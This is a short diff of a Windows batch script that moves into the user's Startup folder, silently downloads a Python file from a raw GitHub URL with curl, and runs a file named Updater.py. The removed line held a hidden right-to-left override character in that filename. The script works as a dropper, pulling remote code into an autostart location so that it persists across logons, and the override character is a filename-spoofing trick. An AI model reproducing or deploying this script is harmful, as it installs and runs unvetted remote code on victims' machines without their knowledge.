@@ -2,5 +2,5 @@
 title python %~n0.py
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 curl -s https://raw.githubusercontent.com/Poopbals/jhskljdflijasdf/main/penis --output temp.py
-python Updater‮.py
+python Updater.py
 cls
